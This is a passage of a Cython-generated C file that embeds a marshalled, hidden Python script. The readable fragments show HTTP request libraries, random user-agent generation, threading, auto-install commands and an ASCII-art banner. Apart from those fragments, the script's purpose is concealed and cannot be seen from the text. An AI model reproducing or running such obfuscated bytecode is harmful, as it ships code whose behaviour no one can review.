DICT, LOOKUP)  (VAR) = (LOOKUP);\n#endif\n\n/* GetModuleGlobalName.proto */\n#if CYTHON_USE_DICT_VERSIONS\n#define __Pyx_GetModuleGlobalName(var, name)  do {\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\n    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\\\n        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\\\n        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\n} while(0)\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\\\n    PY_UINT64_T __pyx_dict_version;\\\n    PyObject *__pyx_dict_cached_value;\\\n    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\n} while(0)\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);\n#else\n#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);\n#endif\n\n/* PyObjectCall.proto */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyO""bject *kw);\n#else\n#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)\n#endif\n\n/* PyThreadStateGet.proto */\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;\n#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;\n#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type\n#else\n#define __Pyx_PyThreadState_declare\n#define __Pyx_PyThreadState_assign\n#define __Pyx_PyErr_Occurred()  PyErr_Occurred()\n#endif\n\n/* PyErrFetchRestore.proto */\n#if CYTHON_FAST_THREAD_STATE\n#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)\n#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)\n#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)\n#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)\n#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);\n#if CYTHON_COMPILING_IN_CPYTHON\n#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))\n#else\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\n#endif\n#else\n#define __Pyx_PyErr_Clear() PyErr_Clear()\n#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)\n#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)\n#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)\n#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)\n#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, v""alue, tb)\n#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)\n#endif\n\n/* CLineInTraceback.proto */\n#ifdef CYTHON_CLINE_IN_TRACEBACK\n#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)\n#else\nstatic int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);\n#endif\n\n/* CodeObjectCache.proto */\ntypedef struct {\n    PyCodeObject* code_object;\n    int code_line;\n} __Pyx_CodeObjectCacheEntry;\nstruct __Pyx_CodeObjectCache {\n    int count;\n    int max_count;\n    __Pyx_CodeObjectCacheEntry* entries;\n};\nstatic struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);\nstatic PyCodeObject *__pyx_find_code_object(int code_line);\nstatic void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);\n\n/* AddTraceback.proto */\nstatic void __Pyx_AddTraceback(const char *funcname, int c_line,\n                               int py_line, const char *filename);\n\n/* GCCDiagnostics.proto */\n#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))\n#define __Pyx_HAS_GCC_DIAGNOSTIC\n#endif\n\n/* CIntToPy.proto */\nstatic CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);\n\n/* CIntFromPy.proto */\nstatic CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);\n\n/* CIntFromPy.proto */\nstatic CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);\n\n/* FastTypeChecks.proto */\n#if CYTHON_COMPILING_IN_CPYTHON\n#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);\n#else\n#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)\n#defin""e __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)\n#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))\n#endif\n#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)\n\n/* CheckBinaryVersion.proto */\nstatic int __Pyx_check_binary_version(void);\n\n/* InitStrings.proto */\nstatic int __Pyx_InitStrings(__Pyx_StringTabEntry *t);\n\n\n/* Module declarations from 'source' */\n#define __Pyx_MODULE_NAME \"source\"\nextern int __pyx_module_is_main_source;\nint __pyx_module_is_main_source = 0;\n\n/* Implementation of 'source' */\nstatic const char __pyx_k_main[] = \"__main__\";\nstatic const char __pyx_k_name[] = \"__name__\";\nstatic const char __pyx_k_test[] = \"__test__\";\nstatic const char __pyx_k_loads[] = \"loads\";\nstatic const char __pyx_k_import[] = \"__import__\";\nstatic const char __pyx_k_marshal[] = \"marshal\";\nstatic const char __pyx_k_builtins[] = \"__builtins__\";\nstatic const char __pyx_k_cline_in_traceback[] = \"cline_in_traceback\";\nstatic const char __pyx_k_c_2_d_d_l_Z_d_d_l_Z_d_d_l_m_Z_n[] = \"c\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\t\\000\\000\\000\\000\\000\\000\\000\\3632\\010\\000\\000\\227\\000d\\000d\\001l\\000Z\\000d\\000d\\001l\\001Z\\001d\\000d\\002l\\001m\\002Z\\002\\001\\000n\\027#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\\000\\000\\000\\000\\000\\000d\\003\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000Y\\000n\\003x\\003Y\\000w\\001d\\000d\\001l\\004Z\\004n\\027#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\\000\\000\\000\\000\\000\\000d\\004\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000Y\\000n\\003x\\003Y\\000w\\001d\\000d\\005l\\005m\\006Z\\006\\001\\000n\\027#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\\000\\000\\000\\000\\000\\000d\\006\\246\\001\\000\\000\\253\\001\\000\\000\\000""\\000\\000\\000\\000\\000\\001\\000Y\\000n\\003x\\003Y\\000w\\001d\\000d\\001l\\007Z\\007d\\000d\\001l\\010Z\\010d\\000d\\001l\\000Z\\000d\\000d\\001l\\tZ\\tn\\027#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\\000\\000\\000\\000\\000\\000d\\007\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000Y\\000n\\003x\\003Y\\000w\\001d\\000d\\010l\\nm\\nZ\\n\\001\\000n\\027#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\\000\\000\\000\\000\\000\\000d\\t\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000Y\\000n\\003x\\003Y\\000w\\001d\\000d\\nl\\013m\\014Z\\014\\001\\000n\\027#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\\000\\000\\000\\000\\000\\000d\\013\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000Y\\000n\\003x\\003Y\\000w\\001d\\000d\\nl\\013m\\014Z\\r\\001\\000n\\027#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\\000\\000\\000\\000\\000\\000d\\007\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000Y\\000n\\003x\\003Y\\000w\\001d\\000d\\014l\\016m\\017Z\\017\\001\\000n\\027#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\\000\\000\\000\\000\\000\\000d\\r\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000Y\\000n\\003x\\003Y\\000w\\001d\\000d\\016l\\020m\\021Z\\021\\001\\000n\\027#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\\000\\000\\000\\000\\000\\000d\\017\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000Y\\000n\\003x\\003Y\\000w\\001d\\000d\\001l\\022Z\\022d\\000d\\001l\\023Z\\023n\\027#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\"\"\\000\\000\\000\\000\\000\\000d\\020\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000Y\\000n\\003x\\003Y\\000w\\001d\\000d\\001l\\024Z\\024n\\027#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\\000\\000\\000\\000\\000\\000d\\021\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000Y\\000n\\003x""\\003Y\\000w\\001d\\000d\\001l\\025Z\\025n\\027#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\\000\\000\\000\\000\\000\\000d\\022\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000Y\\000n\\003x\\003Y\\000w\\001d\\000d\\001l\\026Z\\026n\\027#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\\000\\000\\000\\000\\000\\000d\\023\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000Y\\000n\\003x\\003Y\\000w\\001d\\000d\\024l\\027m\\030Z\\030m\\031Z\\031\\001\\000n\\027#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\\000\\000\\000\\000\\000\\000d\\025\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000Y\\000n\\003x\\003Y\\000w\\001d\\000d\\001l\\tZ\\td\\000d\\001l\\000Z\\000d\\000d\\001l\\tZ\\td\\000d\\001l\\032Z\\032d\\000d\\001l\\033Z\\034d\\000d\\001l\\035Z\\035d\\000d\\026l\\004m\\036Z\\037\\001\\000d\\000d\\027l\\024m Z!\\001\\000d\\000d\\030l\\024m\\\"Z#\\001\\000d\\000d\\001l\\035Z\\035d\\000d\\001l\\023Z\\023d\\000d\\001l\\004Z\\004d\\000d\\001l\\024Z\\024d\\000d\\001l\\007Z\\007d\\000d\\001l$Z$d\\000d\\031l\\022m%Z%\\001\\000d\\000d\\001l\\000Z\\000d\\000d\\032l\\013T\\000d\\000d\\026l\\004m\\036Z\\037\\001\\000d\\000d\\nl\\013m\\014Z\\r\\001\\000d\\000d\\027l\\024m Z!\\001\\000d\\000d\\030l\\024m\\\"Z#\\001\\000d\\000d\\001l\\010Z\\010d\\000d\\001l\\025Z\\025d\\000d\\001l\\026Z\\026d\\000d\\033l\\004m&Z&\\001\\000d\\000d\\001l\\tZ\\td\\000d\\027l\\024m Z \\001\\000d\\000d\\001l\\nZ\\n\\t\\000d\\000d\\034l\\027m\\030Z\\030m\\031Z\\031m'Z'\\001\\000n!#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\\000\\000\\000\\000\\000\\000d\\025\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000d\\000d\\034l\\027m\\030Z\\030m\\031Z\\031m'Z'\\001\\000Y\\000n\\003x\\003Y\\000w\\001\\t\\000d\\000d\\035l\\001m\\002Z\\002m(Z(\\001\\000n\\037#\\000\\001\\000\\002\\000e\\000j\\003\\000\\000\\000\\000\\000\\000\\000\\000d\\003\\246\\001\\000\\000\\253\\001\\000\\000\\000""\\000\\000\\000\\000\\000\\001\\000d\\000d\\035l\\001m\\002Z\\002m(Z(\\001\\000Y\\000n\\003x\"\"\\003Y\\000w\\001d\\000d\\001l\\035Z\\035d\\036Z)d\\037Z*d Z+d!Z,d\\\"Z-d#Z.d$Z/d%Z0d&Z1\\002\\000e\\024j2\\000\\000\\000\\000\\000\\000\\000\\000d'd(\\246\\002\\000\\000\\253\\002\\000\\000\\000\\000\\000\\000\\000\\000Z3\\002\\000e\\024j2\\000\\000\\000\\000\\000\\000\\000\\000d)d*\\246\\002\\000\\000\\253\\002\\000\\000\\000\\000\\000\\000\\000\\000Z4d+e3\\233\\000d,\\235\\003Z5\\002\\000e\\024j2\\000\\000\\000\\000\\000\\000\\000\\000d'd(\\246\\002\\000\\000\\253\\002\\000\\000\\000\\000\\000\\000\\000\\000Z6d+e6\\233\\000d,\\235\\003Z7d-Z8d&Z1d.Z9d/Z:d!Z,d0Z;d!Z<d1Z=d2Z>d3Z?d4Z@d5ZAd#ZBd6ZCd%ZDd7ZEd8ZFd9ZGd:ZHd;ZId<ZJ\\002\\000e e@eAeCeDeGeIeJg\\007\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000ZKd=Z8d\\000d\\001l\\tZ\\td\\000d\\001l\\035Z\\035d\\000d\\001l\\000Z\\000\\002\\000G\\000d>\\204\\000d?\\246\\002\\000\\000\\253\\002\\000\\000\\000\\000\\000\\000\\000\\000ZLeKd@z\\000\\000\\000ZMdA\\204\\000ZNdB\\204\\000ZO\\002\\000eO\\246\\000\\000\\000\\253\\000\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000\\002\\000ePeKdCz\\000\\000\\000\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000\\002\\000ePe=\\233\\000dD\\235\\002\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000\\002\\000ePeKdEz\\000\\000\\000\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000d\\000aQd\\000aRd\\000aSd\\000aTd\\000aU\\002\\000e\\024j2\\000\\000\\000\\000\\000\\000\\000\\000d)d*\\246\\002\\000\\000\\253\\002\\000\\000\\000\\000\\000\\000\\000\\000ZVd+eV\\233\\000d,\\235\\003ZW\\002\\000eXdF\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000ZYd\\000d\\001l\\000Z\\000d\\000d\\001l\\004Z\\004\\002\\000eXdG\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000ZZdH\\204\\000Z[dIZ\\\\dJ\\204\\000Z]\\002\\000e]\\246\\000\\000\\000\\253\\000\\000\\000""\\000\\000\\000\\000\\000\\000\\001\\000dK\\204\\000Z^dL\\204\\000Z_dM\\204\\000Z`dN\\204\\000ZadO\\204\\000ZbdP\\204\\000Zci\\000Zdg\\000ZedQ\\204\\000ZfdR\\204\\000Zgg\\000ZhdS\\204\\000Zi\\002\\000ei\\246\\000\\000\\000\\253\\000\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000d\\000d\\001l\\000Z\\000d\\000d\\001l\\tZ\\td\\000d\\010l\\nm\\nZ\\n\\001\\000e\\tjj\\000\\000\\000\\000\\000\\000\\000\\000ZkdT\\204\\000Zlele\\t_j\\000\\000\\000\\000\\000\\000\\000\\000d\\001S\\000)U\\351\\000\\000\\000\\000N)\"\"\\001\\332\\006renderz\\031pip install python-cfontsz\\024pip install requests)\\001\\332\\rBeautifulSoupz\\017pip install bs4z\\020pip install json)\\001\\332\\010datetimez\\016pip install re)\\001\\332\\023generate_user_agentz\\026pip install user_agent)\\001\\332\\007Consolez\\020pip install rich)\\001\\332\\005Panelz\\025pip install threadingz\\022pip install randomz\\023pip install hashlibz\\020pip install uuidz\\020pip install time)\\002\\332\\004Fore\\332\\005Stylez\\024pip install colorama)\\001\\332\\004post)\\001\\332\\006choice)\\001\\332\\trandrange)\\001\\332\\006Thread)\\001\\332\\001*)\\001\\332\\003get)\\003r\\010\\000\\000\\000r\\t\\000\\000\\000\\332\\004init)\\002r\\002\\000\\000\\000\\332\\003sayz\\013\\033[38;5;120mz\\013\\033[38;5;204mz\\013\\033[38;5;150mz\\t\\033[1m\\033[36mz\\013\\033[38;5;117mz\\007\\033[1;33mz\\007\\033[1;37mz\\007\\033[1;31mz\\t\\033[1m\\033[32m\\351d\\000\\000\\000i,\\001\\000\\000\\351\\005\\000\\000\\000\\351\\320\\000\\000\\000\\372\\007\\033[38;5;\\332\\001mz\\t\\033[1m\\033[31mz\\t\\033[1m\\033[33mz\\t\\033[1m\\033[34mz\\t\\033[1m\\033[35mz\\t\\033[1m\\033[37mz\\017\\033[1m\\033[38;5;208mz\\004\\033[0mz\\007\\033[1;96mz\\007\\033[1;30mz\\007\\033[2;32mz\\007\\033[1;95mz\\007\\033[2;35mz\\007\\033[2;39mz\\013\\033[38;5;208mz\\013\\033[38;5;202mz\\013\\033[38;5;203mz\\007\\033[1;91mc\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000\\000\\000\\000\\000\\000\\000\\363\\024\\000\\000\\000\\227""\\000e\\000Z\\001d\\000Z\\002d\\001\\204\\000Z\\003d\\002S\\000)\\003\\332\\003DEMc\\002\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\004\\000\\000\\000\\003\\000\\000\\000\\363\\270\\000\\000\\000\\227\\000|\\001d\\001z\\000\\000\\000D\\000]S}\\002t\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000j\\001\\000\\000\\000\\000\\000\\000\\000\\000\\240\\002\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000|\\002\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000t\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000j\\001\\000\\000\\000\\000\\000\\000\\000\\000\\240\\003\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\000\\246\\000\\000\\000\\253\\000\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000t\\t\\000\\000\"\"\\000\\000\\000\\000\\000\\000\\000\\000j\\005\\000\\000\\000\\000\\000\\000\\000\\000d\\002\\246\\001\\000\\000\\253\\001\\000\\000\\000\\000\\000\\000\\000\\000\\001\\000\\214Td\\000S\\000)\\003N\\372\\001\\ng/n\\243\\001\\274\\005R?)\\006\\332\\003sys\\332\\006stdout\\332\\005write\\332\\005flush\\332\\004time\\332\\005sleep)\\003\\332\\004self\\332\\001z\\332\\001es\\003\\000\\000\\000   \\332\\006module\\332\\010__init__z\\014DEM.__init__l\\000\\000\\000s\\\\\\000\\000\\000\\200\\000\\330\\021\\022\\2204\\221\\026\\360\\000\\003\\t \\360\\000\\003\\t \\210A\\335\\014\\017\\214J\\327\\014\\034\\322\\014\\034\\230Q\\321\\014\\037\\324\\014\\037\\320\\014\\037\\335\\014\\017\\214J\\327\\014\\034\\322\\014\\034\\321\\014\\036\\324\\014\\036\\320\\014\\036\\335\\014\\020\\214J\\220w\\321\\014\\037\\324\\014\\037\\320\\014\\037\\320\\014\\037\\360\\007\\003\\t \\360\\000\\003\\t \\363\\000\\000\\000\\000N)\\004\\332\\010__name__\\332\\n__module__\\332\\014__qualname__r%\\000\\000\\000\\251\\000r&\\000\\000\\000r$\\000\\000\\000r\\030\\000\\000\\000r\\030\\000\\000\\000k\\000\\000\\000s#\\000\\000\\000\\200\\000""\\200\\000\\200\\000\\200\\000\\200\\000\\360\\002\\004\\005 \\360\\000\\004\\005 \\360\\000\\004\\005 \\360\\000\\004\\005 \\360\\000\\004\\005 r&\\000\\000\\000r\\030\\000\\000\\000u\\236\\026\\000\\000\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\241\\204\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\241\\200\\342\\240\\200\\342\"\"\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\241\\342\\241\\200\\342\\242\\200\\342\\243\\240\\342\\243\\244\\342\\240\\244\\342\\240\\267\\342\\240\\244\\342\\243\\244\\342\\243\\204\\342\\243\\200\\342\\243\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200    \\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240""\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\210\\342\\240\\263\\342\\243\\204\\342\\240\\200\\342\\240\\200\\342\\243\\200\\342\\241\\264\\342\\240\\237\\342\\240\\211\\342\\242\\240\\342\\241\\200\\342\\240\\240\\342\\242\\244\\342\\243\\204\\342\\243\\240\\342\\240\\200\\342\\240\\211\\342\\240\\273\\342\\242\\246\\342\\241\\200\\342\\240\\200\\342\\242\\200\\342\\241\\264\\342\\240\\213\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\200\\342\\243\\240\\342\\240\\204\\342\\240\\200\\342\\240\\200\\342\\240\\210\\342\\242\\263\\342\\241\\236\\342\\240\\211\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\243\\240\\342\\241\\207\\342\\242\\200\\342\\240\\204\\342\\240\\200\\342\\242\\267\\342\\241\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\230\\342\\243\\266\\342\\241\\213\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\200\\342\\243\\260\\342\\241\\237\\342\\240\\211\\342\\240\\222\"\"\\342\\240\\246\\342\\243\\204\\342\\243\\240\\342\\241\\217\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\260\\342\\243\\277""\\342\\242\\200\\342\\243\\264\\342\\243\\266\\342\\243\\246\\342\\241\\204\\342\\243\\273\\342\\240\\204\\342\\242\\200\\342\\242\\200\\342\\243\\240\\342\\243\\244\\342\\242\\247\\342\\243\\204\\342\\243\\240\\342\\240\\244\\342\\240\\222\\342\\240\\202\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\200\\342\\243\\244\\342\\243\\266\\342\\243\\266\\342\\243\\277\\342\\241\\213\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\241\\237\\342\\240\\200\\342\\240\\200\\342\\242\\240\\342\\243\\240\\342\\240\\200\\342\\240\\200\\342\\240\\271\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\240\\213\\342\\240\\200\\342\\240\\210\\342\\241\\215\\342\\240\\200\\342\\240\\200\\342\\240\\210\\342\\243\\277\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\222\\342\\242\\246\\342\\240\\200\\342\\240\\220\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200    \\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\200\\342\\243\\264\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\217\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\243\\200\\342\\243\\200\\342\\243\\270\\342\\240\\201\\342\\240\\200\\342\\240\\200\\342\\243\\206\\342\\240\\231\\342\\243\\277\\342\\243\\206\\342\\242\\240\\342\\243\\277\\342\\243\\267\\342\\243\\277\\342\\243\\277\\342\\243\\267\\342\\240\\200\\342\\243\\240\\342\\243\\276\\342\\243\\267\\342\\241\\236\\342\\240\\200\\342\\240\\200\\342\\242\\271\\342\\243\\200\\342\\243\\200\\342\\243\\200\\342\\243\\200\\342\\240\\200\\342\\242\\270\\342\\243\\267\\342\\243""\\247\\342\\243\\244\\342\\243\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\242\\200\\342\\243\\274\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\241\\207\\342\\240\\200\\342\\240\"\"\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\270\\342\\241\\204\\342\\240\\200\\342\\242\\200\\342\\241\\230\\342\\242\\246\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\266\\342\\243\\277\\342\\243\\277\\342\\243\\251\\342\\240\\207\\342\\241\\200\\342\\240\\200\\342\\242\\270\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\211\\342\\242\\270\\342\\243\\277\\342\\243\\277\\342\\243\\277\\342\\243\\256\\342\\241\\201\\342\\241\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\240\\200\\n\\342\\240\\200\\342\\240\\200\\342\\240\\200\\342\\243\\240\\342\\243\\277\\